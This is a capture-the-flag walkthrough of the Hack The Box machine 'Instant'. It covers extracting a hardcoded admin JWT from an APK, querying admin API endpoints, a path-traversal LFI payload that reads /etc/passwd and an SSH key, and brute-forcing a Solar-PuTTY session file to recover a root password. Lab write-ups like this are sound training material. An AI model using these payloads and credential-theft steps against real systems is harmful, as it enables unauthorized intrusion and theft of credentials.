---
tags:
  -  htb
---
# HTB: [Instant](https://app.hackthebox.com/machines/Instant)

This target's web site advertises a banking system. There's an APK available for download, which leaks two subdomains as well as an authentication token that leads to an LFI, and a private SSH key. The foothold user gives access to an encrypted Solar-PuTTY session file that can be brute-forced, revealing the root password.

## Remote Code Execution

I opened the APK using MobSF and found this credential in `AdminActivities.java`:

```java
new OkHttpClient().newCall(new Request.Builder().url("http://mywalletv1.instant.htb/api/v1/view/profile").addHeader("Authorization", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA").build()).enqueue(new Callback() { // from class: com.instantlabs.instant.AdminActivities.1
```

MobSF also highlights the secret in its interface:

![](_/htb-instant-20241113-1.png)

This allows me to authorize myself with the API:

```console
$ token='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA'

$ curl -k 'http://mywalletv1.instant.htb/api/v1/view/profile' -H "Authorization: $token"
{"Profile":{"account_status":"active","email":"admin@instant.htb","invite_token":"instant_admin_inv","role":"Admin","username":"instantAdmin","wallet_balance":"10000000","wallet_id":"f0eca6e5-783a-471d-9d8f-0162cbc900db"},"Status":200}
```

Here's the token decoded via CyberChef's `JWT Decode`:

```json
{
    "id": 1,
    "role": "Admin",
    "walId": "f0eca6e5-783a-471d-9d8f-0162cbc900db",
    "exp": 33259303656
}
```

I found a `swagger-ui` subdomain with the API docs. This reveals some interesting API methods.

```json
$ curl -k 'http://mywalletv1.instant.htb/api/v1/admin/list/users' -H "Authorization: $token"
{"Status":200,"Users":[{"email":"admin@instant.htb","role":"Admin","secret_pin":87348,"status":"active","username":"instantAdmin","wallet_id":"f0eca6e5-783a-471d-9d8f-0162cbc900db"},{"email":"shirohige@instant.htb","role":"instantian","secret_pin":42845,"status":"active","username":"shirohige","wallet_id":"458715c9-b15e-467b-8a3d-97bc3fcf3c11"}]}
```

Found an LFI via `api/v1/admin/read/log`:

```console
$ curl -X GET "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd" -H  "accept: application/json" -H  "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"
{"/home/shirohige/logs/../../../../../etc/passwd":["root:x:0:0:root:/root:/bin/bash\n","daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n","bin:x:2:2:bin:/bin:/usr/sbin/nologin\n","sys:x:3:3:sys:/dev:/usr/sbin/nologin\n","sync:x:4:65534:sync:/bin:/bin/sync\n","games:x:5:60:games:/usr/games:/usr/sbin/nologin\n","man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n","lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n","mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n","news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n","uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n","proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n","www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n","backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n","list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n","irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n","_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\n","nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n","systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin\n","systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin\n","dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false\n","messagebus:x:101:102::/nonexistent:/usr/sbin/nologin\n","systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin\n","pollinate:x:102:1::/var/cache/pollinate:/bin/false\n","polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin\n","usbmux:x:103:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\n","sshd:x:104:65534::/run/sshd:/usr/sbin/nologin\n","shirohige:x:1001:1002:White Beard:/home/shirohige:/bin/bash\n","_laurel:x:999:990::/var/log/laurel:/bin/false\n"],"Status":201}
```

The LFI worked to grab `id_rsa` for the user flag, allowing SSH login as `shirohige`.

## Privilege Escalation

There's an encrypted session file in `/opt/backups/Solar-PuTTY/sessions-backup.dat`.

<https://github.com/Wind010/SolarPuttyDecryptor.git> worked to brute force the `sessions_backup.dat` file from Solar-PuTTY.

```console
✔ Correct password found on line 5449:  estrella
🚀🚀🚀🚀🚀
{
    "Sessions": [
        {
            "Id": "066894ee-635c-4578-86d0-d36d4838115b",
            "Ip": "10.10.11.37",
            "Port": 22,
            "ConnectionType": 1,
            "SessionName": "Instant",
            "Authentication": 0,
            "CredentialsID": "452ed919-530e-419b-b721-da76cbe8ed04",
            "AuthenticateScript": "00000000-0000-0000-0000-000000000000",
            "LastTimeOpen": "0001-01-01T00:00:00",
            "OpenCounter": 1,
            "SerialLine": null,
            "Speed": 0,
            "Color": "#FF176998",
            "TelnetConnectionWaitSeconds": 1,
            "LoggingEnabled": false,
            "RemoteDirectory": ""
        }
    ],
    "Credentials": [
        {
            "Id": "452ed919-530e-419b-b721-da76cbe8ed04",
            "CredentialsName": "instant-root",
            "Username": "root",
            "Password": "12**24nzC!r0c%q12",
            "PrivateKeyPath": "",
            "Passphrase": "",
            "PrivateKeyContent": null
        }
    ],
    "AuthScript": [],
    "Groups": [],
    "Tunnels": [],
    "LogsFolderDestination": "C:__ProgramData__SolarWinds__Logs__Solar-PuTTY__SessionLogs"
}
```
